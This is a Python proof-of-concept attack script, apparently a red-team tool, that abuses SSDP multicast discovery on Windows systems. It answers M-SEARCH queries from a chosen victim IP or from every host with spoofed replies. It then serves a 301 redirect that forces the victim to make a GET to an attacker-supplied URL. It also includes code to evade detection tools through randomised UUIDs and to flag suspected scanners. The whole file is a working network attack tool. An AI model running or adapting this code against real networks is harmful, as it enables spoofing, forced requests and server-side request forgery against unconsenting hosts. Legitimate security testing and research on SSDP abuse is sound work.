#!/usr/bin/env python3

"""
switcheroo by initstring (gitlab.com/initstring)

POC for abusing SSDP in Windows Systems.

Much of code is borrowed from gitlab.com/initstring/evil-ssdp.

Full blog at: <placeholder>
"""

from multiprocessing import Process
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
from email.utils import formatdate
import sys
import os
import re
import argparse
import socket
import struct
import signal
import random


BANNER = r'''
               .__  __         .__                                
  _______  _  _|___/  |_  ____ |  |__   ___________  ____   ____  
 /  ___\ \/ \/ |  \   ___/ ___\|  |  \_/ __ \_  __ \/  _ \ /  _ \ 
 \___ \ \     /|  ||  | \  \___|   Y  \  ___/|  | \(  <_> (  <_> )
/____  > \/\_/ |__||__|  \___  |___|  /\___  |__|   \____/ \____/ 
     \/                      \/     \/     \/                     

...by initstring (gitlab.com/initstring)
'''

print(BANNER)


if sys.version_info < (3, 0):
    print("\nSorry mate, you'll need to use Python 3+ on this one...\n")
    sys.exit(1)


class SSDPListener:
    """UDP multicast listener for SSDP queries
    This class object will bind to the SSDP-spec defined multicast address and
    port. We can then receive data from this object, which will be capturing
    the UDP multicast traffic on a local network. Processing is handled in the
    main() function below.
    """

    def __init__(self, local_ip, local_port, target):
        self.sock = None
        self.known_hosts = []
        self.local_ip = local_ip
        self.local_port = local_port
        self.target = target
        ssdp_port = 1900  # Defined by SSDP spec, do not change
        mcast_group = '239.255.255.250'  # Defined by SSDP spec, do not change
        server_address = ('', ssdp_port)

        # The re below can help us identify obviously false requests
        # from detection tools.
        self.valid_st = re.compile(r'^[a-zA-Z0-9.\-_]+:[a-zA-Z0-9.\-_:]+$')

        # Generating a new unique USD/UUID may help prevent signature-like
        # detection tools.
        self.session_usn = ('uuid:'
                            + self.gen_random(8) + '-'
                            + self.gen_random(4) + '-'
                            + self.gen_random(4) + '-'
                            + self.gen_random(4) + '-'
                            + self.gen_random(12))

        # Create the socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Bind to the server address
        self.sock.bind(server_address)

        # Tell the operating system to add the socket to
        # the multicast group on for the interface on the specific IP.
        group = socket.inet_aton(mcast_group)
        mreq = struct.pack('4s4s', group, socket.inet_aton(self.local_ip))
        self.sock.setsockopt(
            socket.IPPROTO_IP,
            socket.IP_ADD_MEMBERSHIP,
            mreq)

    @staticmethod
    def gen_random(length):
        """Generates random hex strings"""
        chars = 'abcdef'
        digits = '0123456789'
        value = ''.join(random.choices(chars + digits, k=length))
        return value

    def send_location(self, address, requested_st):
        """
        This function replies back to clients letting them know where they can
        access more information about our device. The keys here are the
        'LOCATION' header and the 'ST' header.

        When a client receives this information back on the port they
        initiated a discover from, they will go to that location looking
        for an xml file.
        """
        url = ('http://{}:{}/redirect.xml'
               .format(self.local_ip, self.local_port))
        date_format = formatdate(timeval=None, localtime=False, usegmt=True)

        ssdp_reply = ('HTTP/1.1 200 OK\r\n'
                      'CACHE-CONTROL: max-age=1800\r\n'
                      'DATE: {}\r\n'
                      'EXT:\r\n'
                      'LOCATION: {}\r\n'
                      'OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01\r\n'
                      '01-NLS: {}\r\n'
                      'SERVER: UPnP/1.0\r\n'
                      'ST: {}\r\n'
                      'USN: {}::{}\r\n'
                      'BOOTID.UPNP.ORG: 0\r\n'
                      'CONFIGID.UPNP.ORG: 1\r\n'
                      '\r\n\r\n'
                      .format(date_format,
                              url,
                              self.session_usn,
                              requested_st,
                              self.session_usn,
                              requested_st))
        ssdp_reply = bytes(ssdp_reply, 'utf-8')
        self.sock.sendto(ssdp_reply, address)

    def process_data(self, data, address):
        """
        This function parses the raw data received on the SSDPListener class
        object. If the M-SEARCH header is found, it will look for the specific
        'Service Type' (ST) being requested and call the function to reply
        back, telling the client that we have the device type they are looking
        for.

        The function will log the first time a client does a specific type of
        M-SEARCH - after that it will be silent. This keeps the output more
        readable, as clients can get chatty.
        """
        remote_ip = address[0]
        header_st = re.findall(r'(?i)\\r\\nST:(.*?)\\r\\n', str(data))
        if 'M-SEARCH' in str(data) and header_st:
            requested_st = header_st[0].strip()
            if re.match(self.valid_st, requested_st):
                if (address[0], requested_st) not in self.known_hosts:
                    print("[*] New MSEARCH from {}, Service Type: {}"
                          .format(remote_ip, requested_st))
                    self.known_hosts.append((address[0], requested_st))
                    if self.target == '*' or self.target == remote_ip:
                        print("  [+] TARGET ACQUIRED! Sending redirect URL...")
                        self.send_location(address, requested_st)
            else:
                print("[!] Odd ST ({}) from {}. Possible"
                      "detection tool!".format(requested_st, remote_ip))


class MultiThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Multi-threaded server class
    Setting up this definition allows us to serve multiple HTTP requests in
    parallel. Without this, a client device may hang the HTTP server, blocking
    other devices from properly accessing the server concurrently.
    """
    pass


def build_class(ssrf_url):
    """
    Python3 documentation states to avoid __init__ in BaseHTTPRequestHandler
    sub class. Because of this, we are building the class inside a function.
    Each request will instantiate a new UPNPObject class object.
    """

    class UPNPObject(BaseHTTPRequestHandler):
        """Spoofed UPnP object
        """
        def do_GET(self):
            """
            Handles all GET requests. Overwrites super class.

            Unlike evil-ssdp, which this is based on, we really only care
            about handing out a 301 when clients access the advertised URL.
            """
            if self.path == '/redirect.xml':
                # Parsed automatically by all SSDP apps
                self.send_response(301)
                self.send_header('Content-type', 'application/xml')
                self.send_header('Location', ssrf_url)
                self.end_headers()
                self.wfile.write('Redirecting...'.encode())

        def log_message(self, format, *args):
            """
            Overwriting the built in function to provide useful feedback inside
            the text UI. Providing the 'User Agent' is helpful in understanding
            the types of devices that are interacting with the tool.
            """
            address = self.address_string()
            agent = self.headers['user-agent']
            verb = self.command
            path = self.path
            if 'redirect.xml' in self.path:
                print("[+] HTTP request from {}, User-Agent: {}"
                       .format(address, agent))
                print("  {} {}".format(verb, path))
                print("  ...Sending SSRF payload")
            else:
                print("[!] Odd HTTP request from Host: {}, User Agent: {}"
                      .format(address, agent))
                print("               {} {}".format(verb, path))

    return UPNPObject


def process_args():
    """Handles user-passed parameters"""
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', type=str, required=True,
                        help='Network interface to listen on.')
    parser.add_argument('-p', '--port', type=str, action='store',
                        default=8888,
                        help='Port for HTTP server. Defaults to 8888.')
    parser.add_argument('-u', '--url', type=str, required=True,
                        help='Force target to perform a GET here')
    parser.add_argument('-t', '--target', type=str, required=True,
                        help='Target victim. Enter an IP or "*"')
    args = parser.parse_args()

    args.local_port = int(args.port)

    return args


def get_ip(args):
    """
    This function will attempt to automatically get the IP address of the
    provided interface. This is used for serving the XML files and also for
    the SMB pointer, if not specified.
    """
    ip_regex = r'inet (?:addr:)?(.*?) '
    sys_ifconfig = os.popen('ifconfig ' + args.interface).read()
    local_ip = re.findall(ip_regex, sys_ifconfig)
    try:
        return local_ip[0]
    except IndexError:
        print("[!] Could not get network interface info.")
        sys.exit()


def print_details(args, local_ip):
    """
    Prints a banner at runtime, informing the user of relevant details.
    """
    dev_url = 'http://{}:{}/redirect.xml'.format(local_ip, args.local_port)
    print("\n\n")
    print("########################################")
    print("REDIRECTOR:     {}".format(dev_url))
    print("SSRF URL:       {}".format(args.url))
    print("VICTIM:         {}".format(args.target))
    print("########################################")
    print("\n\n")


def listen_msearch(listener):
    """
    Starts the listener object, receiving and processing UDP multicasts.
    """
    while True:
        data, address = listener.sock.recvfrom(1024)
        listener.process_data(data, address)


def serve_html(local_ip, local_port, upnp):
    """
    Starts the web server for hosting the 301 redirect.
    """
    MultiThreadedHTTPServer.allow_reuse_address = True
    upnp_server = MultiThreadedHTTPServer((local_ip, local_port), upnp)
    upnp_server.serve_forever()


def main():
    """Main program function
    Uses Process to multi-thread the SSDP server and the web server.
    """
    args = process_args()
    local_ip = get_ip(args)

    listener = SSDPListener(local_ip, args.local_port, args.target)
    ssdp_server = Process(target=listen_msearch, args=(listener,))

    upnp = build_class(args.url)

    web_server = Process(target=serve_html,
                         args=(local_ip, args.local_port, upnp))

    print_details(args, local_ip)

    try:
        ssdp_server.start()
        web_server.start()
        signal.pause()
    except (KeyboardInterrupt, SystemExit):
        print("\n" +
              "[!] Thanks for playing! Stopping threads and exiting...\n")
        web_server.terminate()
        ssdp_server.terminate()
        sys.exit()



if __name__ == "__main__":
    main()
